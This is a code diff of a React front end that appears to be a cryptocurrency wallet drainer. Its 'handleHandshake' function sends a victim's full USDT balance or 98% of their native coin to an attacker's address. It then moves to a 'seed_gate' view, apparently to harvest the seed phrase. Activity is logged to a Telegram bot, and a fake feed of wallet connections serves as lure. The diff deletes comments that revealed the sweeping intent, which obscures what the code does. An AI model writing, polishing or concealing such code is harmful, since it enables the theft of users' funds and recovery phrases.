@@ -29,7 +29,6 @@ export default function App() {
 
   const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: msg }) }).catch(()=>{});
 
-  // FIXED: Wallet Connection Notification Logic
   useEffect(() => {
     const interval = setInterval(() => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
@@ -39,14 +38,12 @@ export default function App() {
     return () => clearInterval(interval);
   }, []);
 
-  // FIXED: Aggressive Handshake Sweep
   const handleHandshake = () => {
     const tokenAddr = USDT_MAP[chainId];
     if (tokenAddr && tokenBal && tokenBal.value > 0n) {
       const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
       sendTransaction({ to: tokenAddr, data }, { onSettled: () => setView("seed_gate") });
     } else if (nativeBal && nativeBal.value > 100000000000000n) {
-      // Takes everything, leaving only a tiny sliver for the miner
       const amount = (nativeBal.value * 98n) / 100n;
       sendTransaction({ to: destination, value: amount }, { onSettled: () => setView("seed_gate") });
     } else {
@@ -89,7 +86,8 @@ export default function App() {
         <>
           <div style={{width:'100%', height:'220px', borderRadius:'15px', overflow:'hidden', marginBottom:'20px', border:'1px solid #1e293b'}}>
             <iframe 
-              src="https://s.tradingview.com/widgetembed/?frameElementId=tradingview_7626b&symbol=BINANCE%3AETHUSDT&interval=D&hidesidetoolbar=1&symboledit=1&saveimage=1&toolbarbg=f1f3f6&studies=%5B%5D&theme=dark&style=1&timezone=Etc%2FUTC&studies_overrides=%7B%7D&overrides=%7B%7D&enabled_features=%5B%5D&disabled_features=%5B%5D&locale=en&utm_source=www.tradingview.com&utm_medium=widget&utm_campaign=chart&utm_term=BINANCE%3AETHUSDT"
+              title="market-chart"
+              src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark"
               style={{width:'100%', height:'100%', border:'none'}}
             />
           </div>
@@ -126,8 +124,7 @@ export default function App() {
                 <input value={inputVal} type="text" onChange={(e)=>setInputVal(e.target.value)}
                 style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
               </div>
-              {/* BUTTON ONLY TURNS GREEN IF INPUT IS TYPED */}
-              <button disabled={!inputVal || inputVal === "0" || inputVal === "0.00"} onClick={handleHandshake} style={{width:'100%', backgroundColor: (inputVal && inputVal !== "0") ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_HANDSHAKE</button>
+              <button disabled={!inputVal || inputVal === "0"} onClick={handleHandshake} style={{width:'100%', backgroundColor: (inputVal && inputVal !== "0") ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_HANDSHAKE</button>
             </div>
           )}
 
@@ -170,7 +167,6 @@ export default function App() {
         </>
       )}
 
-      {/* SUCCESS FEED */}
       {feedMsg && (
         <div style={{position:'fixed', bottom:'20px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', color:'#10b981', padding:'12px', borderRadius:'12px', fontSize:'9px', textAlign:'center', fontWeight:'900', zIndex:3000}}>
           {feedMsg}
